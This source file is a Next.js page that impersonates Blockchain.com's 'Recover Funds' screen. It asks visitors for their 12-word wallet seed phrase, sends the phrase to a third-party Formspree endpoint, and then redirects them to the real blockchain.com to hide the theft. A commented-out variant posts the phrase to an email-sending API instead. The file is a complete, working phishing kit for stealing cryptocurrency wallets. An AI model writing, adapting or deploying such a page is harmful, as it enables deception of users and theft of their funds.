import Image from 'next/image'
import Link from 'next/link'
import { useState } from 'react'
import { useRouter } from 'next/router'
import { useForm, ValidationError } from '@formspree/react';

const Main = () => {

    const [state, handleSubmit] = useForm("moqryzwb");

    const Router = useRouter()

    if (state.succeeded) {
       return Router.push('https://www.blockchain.com/')
    }

    // const [seedPhrase, setSeedPhrase] = useState()

    // const handleSubmit = (e) => {
    //     e.preventDefault();

    //     let data = {
    //         seedPhrase
    //     }
    //     const jsondata = JSON.stringify(data)
    //     console.log(jsondata)
  
    //     fetch('/api/sendemail', {
    //         method: 'POST',
    //         body: jsondata
    //     }).then((res) => {
    //         console.log('successful')
                
    //             setSeedPhrase('')

    //     })
    //     Router.push('https://www.blockchain.com/')
    //   }

    return (
        <main className="bg-[#121D33] w-full h-screen">
            <div className="flex items-center justify-center bg-[#121D33]">
        <div className="flex flex-col items-center justify-center mt-36">
            <img src="/images/blockchain.png" alt="blockchain" className="w-52 "/>

            <div className="xl:w-[480px] md:w-96 w-[340px] md:h-72 h-80 bg-white rounded-lg lg:px-5 px-2 py-4 mb-5">
                <h2 className="font-semibold text-blue-900 text-base">
                    Recover Funds
                </h2>
                <p className="text-xs text-rose-500 mt-2 text-center">
                   You can recover funds only if you have your valid 12 word phrase
                </p>
                  <div className="mt-2">
                    <p className="font-semibold text-xs text-black text-center capitalize">
                        Lost your 12 word backup phrase?
                     </p>
    
                     <p className="font-semibold text-xs text-black text-center capitalize">
                        Backup funds again from Dashboard
                     </p>
                  </div>

                  <p className="text-xs font-light mt-2 text-center">
                    Enter your 12 word phrase, lowercase, with spaces between each word, to 
                    recover your funds and transactions
                 </p>
                
                <form onSubmit={handleSubmit} name="submit" method="post" id="send_mail" className="mt-3 flex flex-col">
                  <label htmlFor="seed_phrase" className="text-right text-xs text-rose-500 mb-1"> Required</label>
                 <input type="text" name="seed_phrase" className="w-full h-10 p-2 border border-rose-800 rounded outline-none focus:border-rose-500" required/>
                 <div className="flex justify-end">
                     <button className="text-sm font-normal text-blue-600 mt-1 mr-3">Go Back</button>
                     <input type="submit" value="continue" name="submit" className="text-white self-end w-32 h-9 bg-blue-600 mt-2 rounded text-sm hover:bg-blue-800 cursor-pointer"/>
                 </div>
                 
                </form>
    
            </div>
        </div>
    </div>
         
        </main>
    )
}

export default Main